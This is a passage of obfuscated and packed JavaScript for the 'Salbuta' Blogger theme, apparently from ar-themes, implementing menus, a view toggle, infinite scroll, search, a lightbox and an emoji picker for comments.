                            a[_$_3baf[75]] = a[_$_3baf[75]][_$_3baf[80]](0, i[_$_3baf[12]])
                        }
                        $[_$_3baf[77]](a[_$_3baf[75]], function(_, a) {
                            a[_$_3baf[16]] = a[_$_3baf[16]][_$_3baf[82]](/'/g, _$_3baf[81]), i[_$_3baf[5]] != _$_3baf[17] && i[_$_3baf[5]] != _$_3baf[30] || f[_$_3baf[83]](l(i, a, _$_3baf[17])), i[_$_3baf[5]] == _$_3baf[10] && f[_$_3baf[83]](l(i, a, _$_3baf[10]))
                        }), 0 < f[_$_3baf[78]] ? (n[_$_3baf[84]](_$_3baf[4]), i[_$_3baf[5]] == _$_3baf[17] && n[_$_3baf[87]](_$_3baf[85] + i[_$_3baf[16]] + _$_3baf[86]), i[_$_3baf[5]] != _$_3baf[17] && i[_$_3baf[5]] != _$_3baf[30] || n[_$_3baf[87]](_$_3baf[88] + (i[_$_3baf[5]] == _$_3baf[17] ? _$_3baf[89] : _$_3baf[90]) + _$_3baf[91] + f[_$_3baf[92]](_$_3baf[4]) + _$_3baf[93] + (i[_$_3baf[5]] == _$_3baf[17] ? _$_3baf[4] : _$_3baf[94]) + _$_3baf[95] + (i[_$_3baf[5]] == _$_3baf[17] ? _$_3baf[4] : _$_3baf[96]) + _$_3baf[97]), i[_$_3baf[5]] == _$_3baf[10] && n[_$_3baf[87]](_$_3baf[98] + f[_$_3baf[92]](_$_3baf[4]) + _$_3baf[99])) : n[_$_3baf[100]]()
                    } else o = !0, n[_$_3baf[84]](_$_3baf[4]), i[_$_3baf[5]] != _$_3baf[17] && i[_$_3baf[5]] != _$_3baf[30] || n[_$_3baf[100]](), i[_$_3baf[5]] == _$_3baf[10] && n[_$_3baf[87]](r(_$_3baf[101], _$_3baf[4], _$_3baf[102]))
                },
                error: function(_) {
                    n[_$_3baf[84]](_$_3baf[4]), 404 == _[_$_3baf[103]] ? n[_$_3baf[87]](r(_$_3baf[101], _$_3baf[4], _$_3baf[104])) : 401 == _[_$_3baf[103]] ? n[_$_3baf[87]](r(_$_3baf[101], _$_3baf[4], _$_3baf[105])) : n[_$_3baf[87]](r(_$_3baf[101], _$_3baf[4], _$_3baf[106] + _[_$_3baf[103]] + _$_3baf[107]))
                },
                complete: function() {
                    n[_$_3baf[109]](_$_3baf[108]), o || i[_$_3baf[111]][_$_3baf[110]](this, n)
                }
            })
        })
    }
}(jQuery);

// Salbuta Theme Script by https://ar-themes.blogspot.com
var _0xf807 = ['$(6(){o a=6(a,b){2b(b)37{a()}38(l){E.1F&&E.1F.2c&&E.1F.2c(l)}},d=6(){"14"==1G.2d("1H")&&$((1q?"":"#y ")+".1r").t(6(){o a=$(i).A(".1f");a.s("7-5-1g","15: "+a.7("15")+"; 1I: 1s")})},e=6(){1G.2e("1H","14",{2f:2g});$((1q?"":"#y ")+".1r").t(6(){o a=$(i).A(".1f");a.s("7-5-1g","15: "+a.7("15")+"; 1I: 1s");0<a.P&&$(i).39(2h,6(){N.O(1t=$("#1J")[0],w="O");0==$("#Q-1K-1").P&&$("3a").F("<2i 1h=\'Q-1K-1\' w=\'1L/3b\'>"+(1q?"":"#y ")+".1f + .1r{3c:3d}</2i>")})})},f=6(){1G.2e("1H","1M",{2f:2g});$((1q?"":"#y ")+".1r").t(6(){$(i).A(".1f").1N("7-5-1g");$("#Q-1K-1").1u();$(i).3e(2h,6(){N.O(1t=$("#1J")[0],w="O")})})},g=6(){$("#y .3f.3g").t(6(){o a=$(i),b=a.7("1h");3h("3i"+b).3j(6(a,c){3k 3l.3m(a)}).2j(6(l,c){a.n("3n"+l)})})},h=3o.3p();a(6(){$(".3q").2k("\\1O!-- .16 --\\1P<8 9=\'16"+(2l?"":" 5-3r")+"\' 7-5-1Q=\'3s:1R\' 1h=\'16\'><8 9=\'5-1Q-3t 5-1S-1u"+(2l?"":" 5-3u-3v")+"\'><R 9=\'5-j-R 5-1Q-1v\' 7-5-1v=\'\'/></8></8>\\1O!-- .17 --\\1P<8 9=\'5-17-2m 5-17\' 7-5-17=\'\' 1h=\'3w\'><8 9=\'5-17-3x 5-1T 5-1T-1U 5-1T-3y\' 7-5-2n-3z=\'\'><R 9=\'5-17-1v-2m\' 7-5-1v=\'\'/><1w 2o=\'/S\' 9=\'5-S 5-S-3A 5-1S-1i-C 5-1S-1i-T\'><8 9=\'5-1j-1-1 5-3B\'><R 9=\'5-1w-j 5-1w-j-3C\' 7-5-j=\'j:S;I:2\' w=\'3D\'/><1k 3E=\'18\' 3F=\'\' 9=\'5-S-1k\' 3G=\'"+3H+"\' 2p=\'"+(2q 0!=h.2r.2s?h.2r.2s:"")+"\' 3I=\'q\' w=\'S\'/></8></1w></8></8>\\1O!-- .1V --\\1P<a 9=\'5-j-R 5-1x-3J 5-1x-1W 5-1x-1s-T U\' 7-5-2t=\'\' 7-5-1g=\'1I:C\' 7-5-1V=\'\' 15=\'"+3K+"\' K=\'#!\'/>")},!0);a(6(){$(".3L > B").t(6(){o a=$(i),b=a.3M();a.p("B B").t(6(a){o c=$(i);c.A("a").n("2u"+a).F("<v 9=\'5-V-C\' 7-5-j=\'j:2v-T;I:.75\'></v>");c.n("5-19 5-W-1a-19 5-2w-2x").1l("<8 9=\'5-W-1a\' 7-5-3N=\'3O:3P;3Q-U:3R;1y:.2u"+a+"\'></8>")});a.p("B:3S(.5-19)").t(6(){o a=$(i);a.A("a").F("<v 9=\'5-V-2y-C\' 7-5-j=\'j:2v-2z;I:.75\'></v>");a.n("5-19 5-W-1a-19 5-2w-2x").1l("<8 9=\'5-W-1a\'></8>")});a.p(".G").t(6(){o a=$(i);a.D("r");!a.D("r").J("1m")&&a.A("a").F("<v 9=\'5-V-2y-C\' 7-5-j=\'j:3T-2z;I:.75\'></v>");a.n("5-1L-1U").F("<8 7-5-1X=\'\'></8>").D("r").n("1m")});a.p(".1m").t(6(){o a=$(i),c=a.1b("a"),b=a.p(".G");2b(1<b.P){o k=[],e=3U.2A().1z().3V(".").2B("");b.t(6(){o a=$(i);a.1l("<r><r>");k.3W("<r><a K=\'#\'><v 9=\'5-V-x-T\' 7-5-j=\'3X\'></v>"+(""==a.s("7-1A")?"2C 2D 2E 2F":a.s("7-1A")).1z()+"</a></r>")});a.p("r").1Y("<8 9=\'5-1j-3-4 5-1x-3Y\'><B 1h=\'1Z-X-C-"+e+"\' 9=\'5-3Z\'></B></8>");c.2k("<8 9=\'5-1j-1-4\'><B 9=\'5-X-C\' 7-5-X=\'40:#1Z-X-C-"+e+";20:5-20-2G-C-1W,5-20-2G-T-1W\'>"+k.2B("")+"</B></8>");a.p("8[9*=\'5-1j\']").1Y("<8 9=\'2H 5-W-1a\'><8 9=\'5-2I 5-2I-1i\'></8></8>");c.u("z",6(){c.J("H")?c.18():(b.2J().Y({w:"G",1n:3,Z:6(){d()}}),c.n("H"),a.p(".5-X-C r").2J().n("H"))});a.p(".5-X-C r").t(6(a){o c=$(i);c.1b("a").u("z",6(){c.J("H")?c.18():($("#1Z-X-C-"+e+" r:41-1o("+(a+1).1z()+") .G").Y({w:"G",1n:3,Z:6(){d()}}),c.n("H"))})})}42 a.n("2K"),b.1l("<8 9=\'2H 5-W-1a\'></8>"),c.u("z",6(a){a.1c();c.J("H")?c.18():(b.Y({w:"G",1n:4,Z:6(){d()}}),c.n("H"))})});$(".2L-2M").u("z",6(){N.1g(".2L-2M").U()});$(".16 > 8").t(6(){o a=$(i);a.F(b.10("5-W-19").n("2N"));a.p(".2N > r:1B-1o").1u();a.p(".G").t(6(){$(i).D("r").n("1m")});a.p("B,.G").t(6(){o a=$(i),b=a.A("a");a.n("L");!b.J("11")&&b.n("11").F("<v 7-5-j=\'j:1C;I:.75\'/>");a.D("r").n("2O").s("7-5-21","2P:1R;1p:>.L;1y:>.11").43("<8></8>")});a.u("z",".11",6(){o a=$(i);"j:1C;I:.75"==a.p("[7-5-j]").s("7-5-j")?a.p("[7-5-j]").s("7-5-j","j:2Q;I:.75"):a.p("[7-5-j]").s("7-5-j","j:1C;I:.75");a.A("8").J("L")||a.A("8").n("L")});a.p(".1m").t(6(){o a=$(i),b=a.p(".G"),k=a.1b("8").1b("a");b.n("5-1L-1U");b.F("<8 7-5-1X=\'\'></8>");1<b.P?(a.n("44"),b.1Y("<B 9=\'L\'></B>"),b.1l("<r 9=\'2O\' 7-5-21=\'2P:1R;1p:>.L;1y:>.11\'><8></8></r>"),b.t(6(){o a=$(i);a.45("<a 9=\'11\' K=\'#!\'>"+(""==a.s("7-1A")?"2C 2D 2E 2F":a.s("7-1A")).1z()+"<v 7-5-j=\'j:1C;I:.75\'/></a>");o b=a.A("a"),k=a.D("r");b.u("z",6(c){c.1c();k.J("H")?b.18():(a.Y({w:"G",1n:4,Z:6(){d();a.A("B").n("L")}}),k.n("H"))})})):(a.n("2K"),k.u("z",6(c){c.1c();a.J("H")?k.18():(b.Y({w:"G",1n:4,Z:6(){d();b.A("B").n("L")}}),a.n("H"))}))})})})},!0);a(6(){o a=[E.22.K.1D("&m=1","").1D("?m=1",""),E.22.46+E.22.S.1D("&m=1","").1D("?m=1","")];$(".47 r a,.16 r a").t(6(){-1<$.48($(i).s("K"),a)&&$(i).49("r").n("2R")});$(".16 r.2R[7-5-21] > 8").t(6(){o a=$(i);a.n("5-23");a.1b(".11").p("[7-5-j]").s("7-5-j","j:2Q;I:.75");a.1b(".L").1N("2S").s("4a-2S",!1)});d()},!0);a(6(){$(".y").u("z",".2T .2U .2o",6(){$(i).2V("5-M");$(i).D(".2U").D(".2T").A(".4b").2V("23")});$(".4c").u("z",\'[4d="R"]\',6(){E.23($(i).7("K"),"4e","1j=4f,2n=4g")})},!0);a(6(){g();$("24 .24").s("7-5-12","2W:#y");$(".2X").u("z","a",6(){$(".2X 1d").13($(i).s("7-5-12-2Y"))}).u("2Z","1d",6(){N.12(".24[7-5-12]",{2W:"#y"}).4h($("4i[7-5-12-2Y=\'"+$(i).13()+"\']")[0])});N.30.u("[7-5-12]","4j",6(){$("#y").10("31")});N.30.u("[7-5-12]","4k",6(){0==$("#y > *:4l").P&&$("#y").n("31")})},h.Q.4m);a(6(){$(".1E").t(6(){o a=$(i);a.u("z","a",6(a){o b=$(i),c=b.D("r");a.1c();c.J("5-M")||($(".1E .5-M").10("5-M"),c.n("5-M"),"14"==b.s("7-5-j")?(e(),$(".1E 1d").13("14")):(f(),$(".1E 1d").13("1M")))}).u("2Z","1d",6(){o b=$(i);"14"!=b.13()&&"1M"!=b.13()||a.p(".5-M").10("5-M");"14"==b.13()?(e(),a.p("#4n").D("r").n("5-M")):(f(),a.p("#4o").D("r").n("5-M"))})})},!0);a(6(){$(".25 .1e:1B-1o .1e-1p").s("7-5-4p","1s:.4q;4r:4s;4t:4u")},26);a(6(){$(".27").u("z","a",6(a){o b=$(i),k=b.s("K");a.1c();b.J("28")||(b.n("28"),b.1N("7-5-j"),b.29("<8 7-5-1X=\'\'></8>"),$.4v({4w:k,w:"2d",4x:"29",4y:6(a){o c=$(a).p(".27 a").s("K");2q 0!=c?b.s("K",c):b.D(".27").U();$(a).p(".y 4z").t(6(){$(i).4A("#y");d();g()})},4B:6(){b.29("<v 9=\'5-V-1i-T\'>"+b.s("15")+"</v>");b.s("7-5-j","4C");b.10("28");$(".y .1f a 4D").u("32",6(){o a=$(".25 .1e:1B-1o .1e-1p");26&&0<a.P&&N.O(1t=a[0],w="O")})}}))})},4E);a(6(){h.4F.4G.4H&&$(".1J").s("7-5-4I","1y:a[4J]");$(".33").Y({w:"4K",4L:4M,Z:6(){d()}})},h.Q.4N);a(6(){o a=[$(".4O"),"4P","4Q","4R","4S","4T","4U","4V","4W","4X","4Y","4Z","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","5g","5h","5i","5j","5k","5l","5m","5n","5o","5p","5q","5r","5s","5t","5u","5v","5w","5x","5y","5z","5A","5B","5C","5D","5E","5F","5G","5H","5I","5J","5K","5L","5M","5N","5O","5P","5Q","5R","5S","5T","5U","5V","5W","5X","5Y","5Z","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","6g","6h","6i","6j","6k","6l","6m","6n","6o","6p","6q","6r","6s","6t","6u","6v","6w","6x","6y","6z","6A","6B","6C","6D","6E","6F","6G","6H","6I","6J","6K","6L","6M","6N","6O","6P","6Q"];a[0].F("<8 9=\'34 5-R 5-V-6R\'><v 9=\'5-V-1i-T\' 7-5-j=\'6S\'></v><v>"+6T+"</v></8><8 9=\'35\'><8 9=\'2a\'></8></8>");a[0].p(".2a").F("<8 9=\'6U\'>"+6V+"</8>");a.2j(6(b,d){0<d&&a[0].p(".2a").F("<v 9=\'6W"+d+"\'><1k 2p=\'&#x"+a[d]+"\' 6X=\'\'/></v>")});a[0].u("z","1k",6(b){b.1c();a[0].p("1k").6Y();$(i).1d().6Z()});a[0].p(".34").u("z",6(){a[0].p(".35").70().71()})},h.Q.72);a(6(){$(".33").Y({w:"2A",Z:6(){d()}})},h.Q.73);a(6(){o a=$("[7-5-1V]");$(E).36()&&a.10("U");$(E).2t(6(){$(E).36()?a.10("U"):a.n("U")})},!0)});$(E).u("32",6(){o a=$(".25 .1e:1B-1o .1e-1p");26&&0<a.P&&74(6(){N.O(1t=a[0],w="O")},76);$(".77").1u()});', "|", "split", "|||||uk|function|data|div|class|||||||||this|icon||||addClass|var|find||li|attr|each|on|span|type||blog_posts|click|siblings|ul|left|parent|window|append|mega|mega_loaded|ratio|hasClass|href|drop_content|active|UIkit|update|length|view|button|search|right|hide|margin|navbar|tab|arThemes|onComplete|removeClass|drop_title|filter|val|shrink|title|sidemenu|modal|off|nav|dropdown|children|preventDefault|select|widget|post_thumbnail|tooltip|id|small|width|input|wrap|has_mega|count|child|content|enableShrinkingForAll|post_content|bottom|element|remove|close|form|position|toggle|toString|label|last|plus|replace|select_view|console|Cookies|grid_view|pos|post_body|skin|text|expand|removeAttr|x3c|x3e|offcanvas|true|padding|flex|center|totop|medium|spinner|wrapAll|component|animation|accordion|location|open|main|sidebar|enableStickySidebar|blog_pager|loading|html|comments_emotions_content|if|error|get|set|expires|99999|400|style|forEach|after|enableLightStyle|full|height|action|value|void|blog|searchQuery|scroll|sd_|chevron|list|divider|xsmall|down|random|join|Label|Name|Not|Found|slide|mega_menu|grid|first|has_single_mega|haeder|menu|sidemenu_list|has_drop|multiple|minus|current|hidden|post_meta|post_share|toggleClass|target|select_label|control|change|util|no_matching_results|load|post_related|comments_emotions_button|comments_emotions_content_wrapper|scrollTop|try|catch|slideUp|head|css|display|none|slideDown|post|hentry|eval|filterTags_|map|return|filterTags|indexOf|filter_|_WidgetManager|_GetAllData|sidenav|light|overlay|bar|background|secondary|search_modal|dialog|middle|viewport|large|inline|flip|submit|autocomplete|autofocus|placeholder|textSearch|name|fixed|textBackToTop|mainnav_menu|clone|drop|mode|hover|delay|100|not|triangle|Math|split|push|tag|relative|switcher|connect|nth|else|wrapInner|has_multi_mega|before|pathname|mainnav|inArray|parents|aria|post_snippet|post_share_buttons|role|_blank|640|430|apply|option|beforeFilter|afterFilter|visible|isHomepage|view_s|view_e|sticky|main_content|offset|80|media|992|ajax|url|dataType|success|article|appendTo|complete|more|img|enableInfiniteScroll|widgets|Blog1|lightboxEnabled|lightbox|imageanchor|related|tags|labelsName|isPost|comments_emotions|1f600|1f601|1f602|1f923|1f603|1f604|1f605|1f606|1f609|1f60a|1f60b|1f60e|1f60d|1f618|1f617|1f619|1f61a|263a|1f642|1f917|1f929|1f914|1f928|1f610|1f611|1f636|1f644|1f60f|1f623|1f625|1f62e|1f910|1f62f|1f62a|1f62b|1f634|1f60c|1f61b|1f61c|1f61d|1f924|1f612|1f613|1f614|1f615|1f643|1f911|1f632|2639|1f641|1f616|1f61e|1f61f|1f624|1f622|1f62d|1f626|1f627|1f628|1f629|1f92f|1f62c|1f630|1f631|1f633|1f92a|1f635|1f621|1f620|1f92c|1f637|1f912|1f915|1f922|1f92e|1f927|1f607|1f920|1f921|1f925|1f92b|1f92d|1f9d0|1f913|1f608|1f47f|1f4a9|1f63a|1f638|1f639|1f63b|1f63c|1f63d|1f640|1f63f|1f63e|1f932|1f64c|1f44f|1f91d|1f44d|1f44e|1f44a|270a|1f91b|1f91c|1f91e|270c|1f91f|1f918|1f44c|1f448|1f449|1f446|1f447|261d|270b|1f91a|1f590|1f596|1f44b|1f919|1f4aa|1f64f|2714|274c|top|happy|textEmotions|emoji_note|textEmotionsInfo|emoji_|readonly|blur|focus|stop|slideToggle|isSingleItem|isError|setTimeout||1E3|js", "", "fromCharCode", "replace", "\\w+", "\\b", "g"];
eval(function(a, e, t, o, f, n) {
    if (f = function(a) {
            return (a < 62 ? _0xf807[4] : f(parseInt(a / 62))) + (35 < (a %= 62) ? String[_0xf807[5]](a + 29) : a.toString(36))
        }, !_0xf807[4][_0xf807[6]](/^/, String)) {
        for (; t--;) n[f(t)] = o[t] || f(t);
        o = [function(a) {
            return n[a]
        }], f = function() {
            return _0xf807[7]
        }, t = 1
    }
    for (; t--;) o[t] && (a = a[_0xf807[6]](new RegExp(_0xf807[8] + f(t) + _0xf807[8], _0xf807[9]), o[t]));
    return a
}(_0xf807[0], 0, 442, _0xf807[3][_0xf807[2]](_0xf807[1]), 0, {}));